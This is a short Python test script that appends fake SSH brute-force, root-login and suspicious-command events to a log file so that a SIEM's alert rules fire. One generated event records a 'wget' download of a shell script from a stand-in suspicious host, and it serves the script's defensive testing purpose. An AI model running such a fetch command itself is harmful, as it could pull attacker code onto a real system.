import time
from datetime import datetime
import os

def create_test_event(filename, event):
    """Append a test event to the log file"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(filename, 'a') as f:
        f.write(f'\n{timestamp} {event}')

def run_test():
    """Run a series of tests to trigger SIEM rules"""
    log_file = os.path.join('logs', 'live_test.log')
    
    # Create new log file
    with open(log_file, 'w') as f:
        f.write("# SIEM Test Log File\n")
    
    print("Starting SIEM test sequence...")
    print("1. Testing SSH brute force detection...")
    
    # Test SSH brute force
    for i in range(6):  # Should trigger threshold of 5
        create_test_event(log_file, 
            "Failed password for admin from 192.168.1.100 port 22")
        time.sleep(1)
    
    print("2. Testing suspicious command detection...")
    # Test suspicious command
    create_test_event(log_file,
        "User executed command: wget http://suspicious.com/script.sh")
    time.sleep(1)
    
    print("3. Testing root login attempt detection...")
    # Test root login attempts
    for i in range(4):  # Should trigger threshold of 3
        create_test_event(log_file,
            "Failed password for root from 192.168.1.101 port 22")
        time.sleep(1)
    
    print("\nTest events have been generated. Check siem_alerts.log for alerts.")
    print("\nExpected alerts:")
    print("- SSH brute force alert (after 5 failed attempts)")
    print("- Suspicious command alert (wget)")
    print("- Root login attempt alert (after 3 attempts)")

if __name__ == "__main__":
    run_test()